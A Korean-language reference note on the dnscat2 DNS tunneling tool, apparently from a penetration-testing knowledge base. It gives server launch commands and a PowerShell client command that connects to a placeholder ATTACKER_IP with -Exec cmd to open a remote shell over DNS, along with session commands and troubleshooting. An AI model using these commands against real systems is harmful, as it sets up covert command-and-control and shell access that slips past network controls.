---
tags:
  - 서비스/dns
  - 기능/피벗
  - 기능/세션관리
실행환경: ["Linux", "Windows"]
필요권한: ["대상 호스트 코드 실행 권한"]
필요조건: ["대상에서 DNS egress 가능", "server와 client가 공유하는 secret"]
결과: ["DNS 터널", "C2 세션", "셸"]
---

# dnscat2

## 도구 개요

dnscat2는 DNS 질의와 응답을 이용해 명령·제어 통신을 전달하고 대화형 `window`와 셸을 제공하는 터널링 도구다. 일반 TCP 연결 대신 DNS 외부 통신 경로를 통해 대상과 제어 채널을 만들 때 적합하다.

## 필요한 입력과 실행 환경

- 실행 위치: 공격 호스트의 dnscat2 server와 대상 호스트의 client
- 필요한 입력: 양쪽이 공유할 secret, 사용할 도메인 또는 직접 질의할 DNS server 주소
- 전제: 대상에서 DNS egress가 허용되고 client를 실행할 코드 실행 권한이 있어야 한다.


## 표준 사용법

```bash
sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<DOMAIN> --no-cache
```

대상에서는 dnscat2 client 또는 PowerShell client를 실행하고, server가 출력한 secret을 맞춘다.

## 대표 예시

### server 시작

```bash
sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<DOMAIN> --no-cache
```

확인할 출력:

- `New window created`
- client용 `--secret` 값.

### PowerShell client

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACKER_IP> -Domain <DOMAIN> -PreSharedSecret <SECRET> -Exec cmd
```

확인할 출력:

- server prompt에 새 session/window.

### window 진입

```text
dnscat2> ?
dnscat2> window -i 1
```

확인할 출력:

- 대상 명령 세션과 상호작용 가능.

## 주요 옵션과 명령

| 명령/옵션 | 의미 | 자주 쓰는 상황 |
|---|---|---|
| `--dns host=<IP>,port=53,domain=<DOMAIN>` | DNS listener 설정 | server 시작 |
| `--no-cache` | DNS cache 영향 감소 | 테스트 중 응답 확인 |
| `-PreSharedSecret` | client/server secret 지정 | 인증/암호화 |
| `-Exec cmd` | cmd 실행 세션 요청 | Windows 셸 확보 |
| `window -i <ID>` | dnscat2 window 진입 | 세션 상호작용 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| `New window created` | client 연결 또는 세션 생성 | `window -i <ID>` |
| secret 출력 | client 인증 준비 | client 옵션에 적용 |
| DNS 질의 없음 | egress/DNS 설정 문제 | `nslookup`, firewall, domain 확인 |
| secret 불일치 | PreSharedSecret 오류 | server가 출력한 secret을 client에 다시 지정 |
| 세션은 있으나 명령 실패 | client 실행 옵션 문제 | `-Exec`, 권한, PowerShell 차단 확인 |

## 관련 공격기법

- [[dnscat2 DNS 터널링]]
